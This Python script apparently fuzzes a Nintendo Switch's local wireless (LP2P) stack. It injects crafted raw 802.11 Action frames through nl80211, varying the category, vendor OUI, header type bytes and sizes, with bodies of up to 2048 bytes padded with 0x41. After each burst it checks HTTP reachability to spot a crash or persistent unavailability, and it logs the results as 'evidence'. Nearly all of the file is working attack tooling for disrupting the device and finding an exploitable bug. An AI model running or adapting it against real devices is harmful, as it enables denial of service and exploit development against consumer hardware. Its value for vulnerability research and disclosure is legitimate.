#!/usr/bin/env -S python3 -u -I
"""Frame path mapper: determine which action frame parameters affect Switch behavior.

Varies OUI, action category, body structure, and LP2P header presence to map
which software layer processes our injected frames.
"""

import os
import struct
import socket
import time
import json
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = "wlp5s0"
SWITCH_MAC = bytes.fromhex("ecc40df3dcdb")
SRC_MAC = bytes.fromhex("227ccee0bd56")
FREQ = 2412
EVIDENCE_PATH = str(_LDN_ROOT / "evidence" / "frame_path_mapping.json")

# OUI values to test
OUI_LP2P = b"\x00\x22\xaa"       # LP2P (used in existing tests)
OUI_NINTENDO = b"\x00\x1f\x32"   # Nintendo
OUI_MICROSOFT = b"\x00\x50\xf2"  # Microsoft WPS/P2P
OUI_GENERIC = b"\xaa\xbb\xcc"    # Made-up / unknown


def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 100
    s.bind((pid, 0))
    name = b'nl80211\x00'
    nla_b = struct.pack('HH', 4 + len(name), 2) + name
    if len(nla_b) % 4:
        nla_b += b'\x00' * (4 - len(nla_b) % 4)
    p = struct.pack('BBH', 3, 1, 0) + nla_b
    s.sendto(struct.pack('IHHII', 16 + len(p), 0x10, 3, 1, pid) + p, (0, 0))
    data = s.recv(8192)
    s.close()
    off = 20
    nllen = struct.unpack_from('I', data, 0)[0]
    while off < nllen:
        nla_len, nla_type = struct.unpack_from('HH', data, off)
        if nla_type == 1:
            return struct.unpack_from('H', data, off + 4)[0]
        off += (nla_len + 3) & ~3
    raise RuntimeError("nl80211 family not found")


def nla(t, d):
    if isinstance(d, int):
        d = struct.pack('I', d)
    n = struct.pack('HH', 4 + len(d), t) + d
    if len(n) % 4:
        n += b'\x00' * (4 - len(n) % 4)
    return n


def send_frame(fam_id, ifindex, frame_bytes):
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 500 + (hash(frame_bytes[:20]) & 0xFFFF)
    s.bind((pid, 0))
    s.settimeout(2.0)
    genlhdr = struct.pack('BBH', 59, 0, 0)
    nla_data = nla(3, ifindex) + nla(38, FREQ) + nla(51, frame_bytes)
    payload = genlhdr + nla_data
    nlhdr = struct.pack('IHHII', 16 + len(payload), fam_id, 1 | 4, 99999, pid)
    try:
        s.sendto(nlhdr + payload, (0, 0))
        resp = s.recv(16384)
        _, msg_type = struct.unpack_from('IH', resp, 0)
        if msg_type == 2:
            err = struct.unpack_from('i', resp, 16)[0]
            s.close()
            return err
        s.close()
        return 0
    except socket.timeout:
        s.close()
        return -110
    except Exception as e:
        s.close()
        return str(e)


def build_80211_action(dst, src, bssid, body):
    """Build a raw 802.11 Action frame."""
    frame = bytearray()
    frame += struct.pack('<H', 0x00D0)   # Frame control: Action
    frame += b"\x00\x00"                 # Duration
    frame += dst
    frame += src
    frame += bssid
    frame += struct.pack('<H', 0x0000)   # Sequence control
    frame += body
    return bytes(frame)


def check_alive():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(('192.168.0.1', 80))
        s.sendall(b'GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        d = s.recv(512)
        s.close()
        return b'HTTP/' in d
    except Exception:
        return False


def wait_alive(timeout=90):
    start = time.time()
    while time.time() - start < timeout:
        if check_alive():
            return True
        time.sleep(2)
    return False


def run_test(fam_id, ifindex, name, frame_bytes, count=20):
    """Send `count` frames, then check HTTP status. Returns result dict."""
    if not check_alive():
        print(f"  [!] Switch not reachable pre-test, waiting...")
        if not wait_alive():
            return {"name": name, "result": "TIMEOUT_PRE", "send_results": [], "frame_size": len(frame_bytes)}

    send_results = []
    for i in range(count):
        rc = send_frame(fam_id, ifindex, frame_bytes)
        send_results.append(rc)
        time.sleep(0.01)

    # Categorize send results
    successes = sum(1 for r in send_results if r == 0)
    errors = {str(r): send_results.count(r) for r in set(send_results) if r != 0}

    time.sleep(5)
    alive_1 = check_alive()
    if not alive_1:
        time.sleep(5)
        alive_2 = check_alive()
        if not alive_2:
            time.sleep(15)
            alive_3 = check_alive()
            status = "UNAVAIL_PERSISTENT" if not alive_3 else "UNAVAIL_DELAYED_RECOVER"
        else:
            status = "UNAVAIL_BRIEF"
    else:
        status = "OK"

    result = {
        "name": name,
        "result": status,
        "frame_size": len(frame_bytes),
        "sent": count,
        "successes": successes,
        "errors": errors if errors else None,
    }
    print(f"  {name}: sent={successes}/{count} status={status}" +
          (f" errors={errors}" if errors else ""))
    return result


def main():
    ifindex = socket.if_nametoindex(IFACE)
    fam_id = get_nl80211_family()
    print(f"Interface: {IFACE} (ifindex={ifindex}), nl80211 family: {fam_id}")

    if not check_alive():
        print("Switch not reachable. Waiting...")
        if not wait_alive(60):
            print("FATAL: Switch not reachable")
            return
    print("Switch is alive.\n")

    results = []

    # ============================================================
    # GROUP 1: Vary action category code
    # ============================================================
    print("=" * 60)
    print("GROUP 1: Action category codes")
    print("=" * 60)

    # Category 0x7F = Vendor-Specific Action (what LP2P uses)
    body_vs = b"\x7f" + OUI_LP2P + b"\x04\x01\x01\x01\x00\x00\x00\x00" + b"\x41" * 64
    frame_vs = build_80211_action(SWITCH_MAC, SRC_MAC, SWITCH_MAC, body_vs)
    results.append(run_test(fam_id, ifindex, "cat_0x7F_vendor_specific", frame_vs))
    time.sleep(20)

    # Category 0x09 = SA Query (protected management)
    body_sa = b"\x09" + b"\x00" * 16
    frame_sa = build_80211_action(SWITCH_MAC, SRC_MAC, SWITCH_MAC, body_sa)
    results.append(run_test(fam_id, ifindex, "cat_0x09_sa_query", frame_sa))
    time.sleep(20)

    # Category 0x04 = Public Action
    body_pub = b"\x04" + b"\x00" * 32
    frame_pub = build_80211_action(SWITCH_MAC, SRC_MAC, SWITCH_MAC, body_pub)
    results.append(run_test(fam_id, ifindex, "cat_0x04_public_action", frame_pub))
    time.sleep(20)

    # Category 0x03 = Block Ack
    body_ba = b"\x03" + b"\x00" * 8
    frame_ba = build_80211_action(SWITCH_MAC, SRC_MAC, SWITCH_MAC, body_ba)
    results.append(run_test(fam_id, ifindex, "cat_0x03_block_ack", frame_ba))
    time.sleep(20)

    # ============================================================
    # GROUP 2: Vary OUI (all with category 0x7F vendor-specific)
    # ============================================================
    print("\n" + "=" * 60)
    print("GROUP 2: OUI values (all vendor-specific 0x7F)")
    print("=" * 60)

    for oui_name, oui_bytes in [("lp2p_0022aa", OUI_LP2P),
                                 ("nintendo_001f32", OUI_NINTENDO),
                                 ("microsoft_0050f2", OUI_MICROSOFT),
                                 ("generic_aabbcc", OUI_GENERIC)]:
        body = b"\x7f" + oui_bytes + b"\x04\x01\x01\x01\x00\x00\x00\x00" + b"\x41" * 64
        frame = build_80211_action(SWITCH_MAC, SRC_MAC, SWITCH_MAC, body)
        results.append(run_test(fam_id, ifindex, f"oui_{oui_name}", frame))
        time.sleep(20)

    # ============================================================
    # GROUP 3: Body structure variations (LP2P OUI + vendor-specific)
    # ============================================================
    print("\n" + "=" * 60)
    print("GROUP 3: Body structure (LP2P OUI)")
    print("=" * 60)

    # Minimal: just category + OUI, no extra data
    body_min = b"\x7f" + OUI_LP2P
    frame_min = build_80211_action(SWITCH_MAC, SRC_MAC, SWITCH_MAC, body_min)
    results.append(run_test(fam_id, ifindex, "body_minimal_4bytes", frame_min))
    time.sleep(20)

    # With LP2P header but NO body[0x21]=0x03 marker
    lp2p_hdr = b"\x7f" + OUI_LP2P + b"\x04\x01\x01\x01\x00\x00\x00\x00"
    body_notype = bytearray(0x100)
    body_notype[:len(lp2p_hdr)] = lp2p_hdr
    body_notype[0x21] = 0x00  # Explicitly NOT type 3
    frame_notype = build_80211_action(SWITCH_MAC, SRC_MAC, SWITCH_MAC, bytes(body_notype))
    results.append(run_test(fam_id, ifindex, "body_lp2p_type0", frame_notype))
    time.sleep(20)

    # With LP2P header + body[0x21]=0x03 (type 3, what existing tests use)
    body_type3 = bytearray(0x100)
    body_type3[:len(lp2p_hdr)] = lp2p_hdr
    body_type3[0x21] = 0x03
    struct.pack_into(">H", body_type3, 0x22, 0x100 - 0x38)
    body_type3[0x26] = 0x01
    body_type3[0x27] = 0x01
    frame_type3 = build_80211_action(SWITCH_MAC, SRC_MAC, SWITCH_MAC, bytes(body_type3))
    results.append(run_test(fam_id, ifindex, "body_lp2p_type3", frame_type3))
    time.sleep(20)

    # With LP2P header + body[0x21]=0x01 (type 1)
    body_type1 = bytearray(0x100)
    body_type1[:len(lp2p_hdr)] = lp2p_hdr
    body_type1[0x21] = 0x01
    frame_type1 = build_80211_action(SWITCH_MAC, SRC_MAC, SWITCH_MAC, bytes(body_type1))
    results.append(run_test(fam_id, ifindex, "body_lp2p_type1", frame_type1))
    time.sleep(20)

    # With LP2P header + body[0x21]=0x02 (type 2)
    body_type2 = bytearray(0x100)
    body_type2[:len(lp2p_hdr)] = lp2p_hdr
    body_type2[0x21] = 0x02
    frame_type2 = build_80211_action(SWITCH_MAC, SRC_MAC, SWITCH_MAC, bytes(body_type2))
    results.append(run_test(fam_id, ifindex, "body_lp2p_type2", frame_type2))
    time.sleep(20)

    # ============================================================
    # GROUP 4: Large frames with LP2P (stress test)
    # ============================================================
    print("\n" + "=" * 60)
    print("GROUP 4: Frame size variations (LP2P type 3)")
    print("=" * 60)

    for body_size, label in [(0x40, "64B"), (0x200, "512B"), (0x800, "2048B")]:
        body = bytearray(body_size)
        body[:len(lp2p_hdr)] = lp2p_hdr
        body[0x21] = 0x03
        if body_size > 0x38:
            struct.pack_into(">H", body, 0x22, body_size - 0x38)
        body[0x26] = 0x01
        body[0x27] = 0x01
        for i in range(0x5C, body_size):
            body[i] = 0x41
        frame = build_80211_action(SWITCH_MAC, SRC_MAC, SWITCH_MAC, bytes(body))
        results.append(run_test(fam_id, ifindex, f"size_{label}_type3", frame))
        time.sleep(20)

    # ============================================================
    # SUMMARY
    # ============================================================
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    for r in results:
        errs = f" errors={r['errors']}" if r.get('errors') else ""
        print(f"  {r['name']:40s} → {r['result']:25s} sent={r['successes']}/{r['sent']}{errs}")

    # Save evidence
    os.makedirs(os.path.dirname(EVIDENCE_PATH), exist_ok=True)
    evidence = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "test": "frame_path_mapping",
        "purpose": "Determine which action frame parameters affect Switch behavior",
        "interface": IFACE,
        "switch_mac": SWITCH_MAC.hex(),
        "results": results,
    }
    with open(EVIDENCE_PATH, 'w') as f:
        json.dump(evidence, f, indent=2)
    print(f"\nEvidence saved to {EVIDENCE_PATH}")


if __name__ == "__main__":
    main()
